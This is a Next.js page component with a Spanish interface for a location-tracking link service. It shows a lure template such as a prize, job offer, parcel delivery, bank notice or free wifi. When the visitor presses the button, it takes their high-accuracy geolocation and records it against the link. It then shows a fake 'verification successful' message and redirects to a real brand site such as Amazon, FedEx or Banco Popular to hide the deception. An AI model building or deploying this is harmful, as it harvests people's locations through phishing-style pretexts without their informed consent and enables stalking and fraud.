"use client"

import { useEffect, useState } from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { TrackingService, type TrackingLink } from "@/lib/services/tracking-service"
import { GeoService } from "@/lib/services/geo-service"
import { getTemplate } from "@/config/templates"

interface TrackPageProps {
  params: {
    shortCode: string
  }
}

export default function TrackPage({ params }: TrackPageProps) {
  const [link, setLink] = useState<TrackingLink | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [showMap, setShowMap] = useState(false)

  useEffect(() => {
    async function loadLink() {
      try {
        const links = await TrackingService.getTrackingLinks()
        const found = links.find(l => l.shortCode === params.shortCode)
        if (found && found.isActive) {
          setLink(found)
        } else {
          setError("Este enlace ha expirado")
        }
      } catch (err) {
        console.error("Error loading tracking link:", err)
        setError("Error al cargar la p√°gina")
      }
    }
    loadLink()
  }, [params.shortCode])

  if (error) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white">
        <div className="container max-w-lg mx-auto p-6">
          <Card className="bg-black/40 backdrop-blur-sm border-gray-800">
            <CardContent className="p-6">
              <div className="text-center text-red-400">{error}</div>
            </CardContent>
          </Card>
        </div>
      </div>
    )
  }

  if (!link) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white">
        <div className="container max-w-lg mx-auto p-6">
          <Card className="bg-black/40 backdrop-blur-sm border-gray-800">
            <CardContent className="p-6">
              <div className="flex justify-center">
                <div className="animate-spin rounded-full h-8 w-8 border-2 border-current" />
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    )
  }

  const template = getTemplate(link.templateType)

  const handleGetLocation = async () => {
    setIsLoading(true)
    setError(null)

    try {
      // Obtener ubicaci√≥n actual
      const position = await GeoService.getCurrentPosition({
        enableHighAccuracy: true,
        timeout: 10000
      })

      // Capturar la ubicaci√≥n
      await TrackingService.captureLocation(link.id, params.shortCode)

      // Mostrar el mapa simulado
      setShowMap(true)

      // Redirigir despu√©s de un breve retraso
      setTimeout(() => {
        // Redirigir seg√∫n el tipo de plantilla
        switch (link.templateType) {
          case "premio":
            window.location.href = "https://www.amazon.com"
            break
          case "empleo":
            window.location.href = "https://www.linkedin.com"
            break
          case "delivery":
            window.location.href = "https://www.fedex.com/tracking"
            break
          case "banco":
            window.location.href = "https://www.bancopopular.com"
            break
          case "actualizacion":
            window.location.href = "https://support.microsoft.com"
            break
          case "social":
            window.location.href = "https://www.facebook.com"
            break
          case "cupon":
            window.location.href = "https://www.groupon.com"
            break
          case "wifi":
            window.location.href = "https://www.speedtest.net"
            break
          default:
            window.location.href = "https://www.google.com"
        }
      }, 2000)

    } catch (err: any) {
      console.error("Error getting location:", err)
      setError(err.message || "Error al procesar tu solicitud")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className={`min-h-screen bg-gradient-to-br ${template.bgColor} text-white`}>
      <div className="container max-w-lg mx-auto p-6">
        <Card className="bg-black/40 backdrop-blur-sm border-gray-800">
          <CardContent className="p-6 space-y-6">
            {/* Encabezado */}
            <div className="text-center space-y-4">
              <div className="text-6xl">{template.icon}</div>
              <h1 className="text-2xl font-bold">{template.title}</h1>
              <p className="text-lg text-muted-foreground">
                {template.subtitle}
              </p>
            </div>

            {/* Mensaje Principal */}
            <div className="text-center py-4">
              <p className="text-lg">{template.message}</p>
            </div>

            {/* Tiempo Restante */}
            {template.validityPeriod && (
              <div className="text-center text-sm text-yellow-400">
                ‚è∞ V√°lido por: {template.validityPeriod}
              </div>
            )}

            {/* Bot√≥n de Acci√≥n */}
            {!showMap && (
              <Button
                className={`w-full bg-gradient-to-r ${template.bgColor} hover:opacity-90`}
                size="lg"
                onClick={handleGetLocation}
                disabled={isLoading}
              >
                {isLoading ? (
                  <div className="flex items-center gap-2">
                    <div className="animate-spin rounded-full h-4 w-4 border-2 border-current" />
                    <span>Procesando...</span>
                  </div>
                ) : (
                  <>
                    <span className="mr-2">{template.icon}</span>
                    {template.buttonText}
                  </>
                )}
              </Button>
            )}

            {/* Mensaje de Error */}
            {error && (
              <div className="bg-red-500/10 border border-red-500/50 rounded-lg p-4 text-red-400">
                {error}
              </div>
            )}

            {/* Mapa Simulado */}
            {showMap && (
              <div className="space-y-4">
                <div className="h-[300px] rounded-lg overflow-hidden">
                  <div className="w-full h-full bg-gray-800 animate-pulse flex items-center justify-center">
                    <div className="animate-spin rounded-full h-8 w-8 border-2 border-current" />
                  </div>
                </div>
                <p className="text-center text-sm text-green-400">
                  ‚úì Verificaci√≥n exitosa. Redirigiendo...
                </p>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
